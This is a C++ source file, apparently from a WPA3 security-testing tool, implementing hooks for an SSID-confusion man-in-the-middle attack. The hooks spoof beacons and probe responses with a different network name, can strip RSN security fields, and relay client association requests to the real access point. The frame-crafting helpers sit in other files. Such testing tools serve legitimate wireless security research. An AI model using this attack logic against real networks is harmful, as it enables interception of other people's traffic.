#include "attacks/mc_mitm/ssid_confusion_hooks.h"
#include "attacks/mc_mitm/client_state.h"
#include "attacks/mc_mitm/mc_mitm.h"
#include "attacks/mc_mitm/wifi_util.h"
namespace wpa3_tester {
using namespace Tins;
using namespace std;

void SsidConfusionHooks::on_probe_response(Dot11ProbeResponse &resp) {
	resp = make_confused_probe_resp(resp, confused_ssid_, strip_rsn_);
}

bool SsidConfusionHooks::send_periodic_beacon(McMitm &m) {
	auto b = make_confused_beacon(*m.beacon, confused_ssid_, strip_rsn_);
	m.send_to_rogue(b);
	return true;
}

bool SsidConfusionHooks::on_assoc_request(McMitm &m, Dot11 &dot11,
										  HWAddress<6>) {
	const auto *assoc = dot11.find_pdu<Dot11AssocRequest>();
	if (!assoc)
		return false;

	auto out = make_real_ssid_assoc_req(*assoc, real_ssid_);
	out.addr1(m.ap_mac);
	out.addr3(m.ap_mac);

	m.send_to_real(out);
	m.client_state.update_state(ClientState::Associated);
	return true;
}
}